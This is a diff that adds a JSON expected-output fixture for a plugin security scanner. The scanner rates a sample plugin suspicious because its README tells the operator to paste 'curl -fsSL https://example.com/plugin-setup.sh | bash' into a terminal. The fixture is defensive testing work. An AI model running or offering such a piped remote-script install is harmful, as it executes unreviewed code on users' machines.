@@ -1,0 +1,203 @@
+{
+  "scannedPath": "<fixture:docs-risk-plugin>",
+  "fingerprint": "sha256:5527d4128f6c7350e7034678c0cd7f61490018bd6b89e6b87aabe4f5cad07a17",
+  "targetType": "directory",
+  "targetKind": "plugin",
+  "fileCount": 3,
+  "filesScanned": [
+    "README.md",
+    "openclaw.plugin.json",
+    "src/index.ts"
+  ],
+  "verdict": "suspicious",
+  "score": 7,
+  "summary": "Suspicious plugin patterns found: remote-script-execution, bootstrap-installer, prompt-directed-shell-execution. Current evidence is mainly documentation signals. Review before trust or enablement.",
+  "packageRecommendation": {
+    "action": "review-before-trust",
+    "reason": "This plugin has findings that need human review before trust (operator prompted to run shell commands)."
+  },
+  "kindSensitiveNotes": [
+    "Plugins have a larger runtime-trust surface. Packaged code, manifests, hooks, and persistence behavior matter more than README-only language.",
+    "The strongest current signal is review-before-trust, not immediate blocking."
+  ],
+  "findings": [
+    {
+      "id": "remote-script-execution:README.md",
+      "category": "remote-script-execution",
+      "severity": "high",
+      "signalType": "documentation",
+      "title": "Remote script execution pattern found",
+      "summary": "This package contains a command that downloads remote content and pipes it straight into a shell or eval path.",
+      "recommendation": "Block or quarantine until the command is replaced with a reviewed, pinned, non-piped install path.",
+      "evidence": [
+        {
+          "filePath": "README.md",
+          "line": 6,
+          "snippet": "curl -fsSL https://example.com/plugin-setup.sh | bash"
+        }
+      ]
+    },
+    {
+      "id": "bootstrap-installer:README.md",
+      "category": "bootstrap-installer",
+      "severity": "medium",
+      "signalType": "documentation",
+      "title": "Bootstrap or installer script behavior referenced",
+      "summary": "This package includes install/bootstrap behavior that deserves review before enablement.",
+      "recommendation": "Require manual review of every install/bootstrap step and verify it is necessary, local, and pinned.",
+      "evidence": [
+        {
+          "filePath": "README.md",
+          "line": 6,
+          "snippet": "curl -fsSL https://example.com/plugin-setup.sh | bash"
+        }
+      ]
+    },
+    {
+      "id": "prompt-directed-shell-execution:README.md",
+      "category": "prompt-directed-shell-execution",
+      "severity": "medium",
+      "signalType": "documentation",
+      "title": "Prompt-instruction to run shell commands found",
+      "summary": "The package documentation or scripts explicitly instruct the operator to run commands in a way that could bypass normal review.",
+      "recommendation": "Review every operator-run command manually and avoid copy-paste execution of unpinned shell snippets.",
+      "evidence": [
+        {
+          "filePath": "README.md",
+          "line": 3,
+          "snippet": "Before using this plugin, copy and paste this command into a terminal exactly as written."
+        }
+      ]
+    }
+  ],
+  "groupedFindings": [
+    {
+      "id": "README.md:remote-script-execution",
+      "title": "Suspicious package pattern group",
+      "summary": "README.md contains related findings: remote-script-execution.",
+      "categories": [
+        "remote-script-execution"
+      ],
+      "signalTypes": [
+        "documentation"
+      ],
+      "severity": "high",
+      "exploitability": "reference-only",
+      "exploitabilityReason": "The evidence is documentation-only and does not appear to auto-execute on its own.",
+      "recommendedAction": "monitor",
+      "recommendedActionReason": "This evidence is low-friction reference material and can be monitored unless stronger signals appear.",
+      "representativeFindingId": "remote-script-execution:README.md",
+      "findingIds": [
+        "remote-script-execution:README.md"
+      ],
+      "filePaths": [
+        "README.md"
+      ]
+    },
+    {
+      "id": "README.md:bootstrap-installer",
+      "title": "Suspicious package pattern group",
+      "summary": "README.md contains related findings: bootstrap-installer.",
+      "categories": [
+        "bootstrap-installer"
+      ],
+      "signalTypes": [
+        "documentation"
+      ],
+      "severity": "medium",
+      "exploitability": "reference-only",
+      "exploitabilityReason": "The evidence is documentation-only and does not appear to auto-execute on its own.",
+      "recommendedAction": "monitor",
+      "recommendedActionReason": "This evidence is low-friction reference material and can be monitored unless stronger signals appear.",
+      "representativeFindingId": "bootstrap-installer:README.md",
+      "findingIds": [
+        "bootstrap-installer:README.md"
+      ],
+      "filePaths": [
+        "README.md"
+      ]
+    },
+    {
+      "id": "README.md:prompt-directed-shell-execution",
+      "title": "Operator prompted to run shell commands",
+      "summary": "README.md instructs the operator to run shell commands manually.",
+      "categories": [
+        "prompt-directed-shell-execution"
+      ],
+      "signalTypes": [
+        "documentation"
+      ],
+      "severity": "medium",
+      "exploitability": "operator-assisted",
+      "exploitabilityReason": "The package relies on operator instructions rather than automatic execution.",
+      "recommendedAction": "review",
+      "recommendedActionReason": "This plugin is being introduced through risky operator-run setup instructions, so it should be reviewed before trust even without packaged runtime execution.",
+      "representativeFindingId": "prompt-directed-shell-execution:README.md",
+      "findingIds": [
+        "prompt-directed-shell-execution:README.md"
+      ],
+      "filePaths": [
+        "README.md"
+      ]
+    }
+  ],
+  "topRisks": [
+    {
+      "title": "Suspicious package pattern group",
+      "summary": "README.md contains related findings: remote-script-execution.",
+      "severity": "high",
+      "signalTypes": [
+        "documentation"
+      ],
+      "categories": [
+        "remote-script-execution"
+      ],
+      "filePaths": [
+        "README.md"
+      ],
+      "exploitability": "reference-only",
+      "exploitabilityReason": "The evidence is documentation-only and does not appear to auto-execute on its own.",
+      "recommendedAction": "monitor",
+      "recommendedActionReason": "This evidence is low-friction reference material and can be monitored unless stronger signals appear.",
+      "groupId": "README.md:remote-script-execution"
+    },
+    {
+      "title": "Suspicious package pattern group",
+      "summary": "README.md contains related findings: bootstrap-installer.",
+      "severity": "medium",
+      "signalTypes": [
+        "documentation"
+      ],
+      "categories": [
+        "bootstrap-installer"
+      ],
+      "filePaths": [
+        "README.md"
+      ],
+      "exploitability": "reference-only",
+      "exploitabilityReason": "The evidence is documentation-only and does not appear to auto-execute on its own.",
+      "recommendedAction": "monitor",
+      "recommendedActionReason": "This evidence is low-friction reference material and can be monitored unless stronger signals appear.",
+      "groupId": "README.md:bootstrap-installer"
+    },
+    {
+      "title": "Operator prompted to run shell commands",
+      "summary": "README.md instructs the operator to run shell commands manually.",
+      "severity": "medium",
+      "signalTypes": [
+        "documentation"
+      ],
+      "categories": [
+        "prompt-directed-shell-execution"
+      ],
+      "filePaths": [
+        "README.md"
+      ],
+      "exploitability": "operator-assisted",
+      "exploitabilityReason": "The package relies on operator instructions rather than automatic execution.",
+      "recommendedAction": "review",
+      "recommendedActionReason": "This plugin is being introduced through risky operator-run setup instructions, so it should be reviewed before trust even without packaged runtime execution.",
+      "groupId": "README.md:prompt-directed-shell-execution"
+    }
+  ]
+}
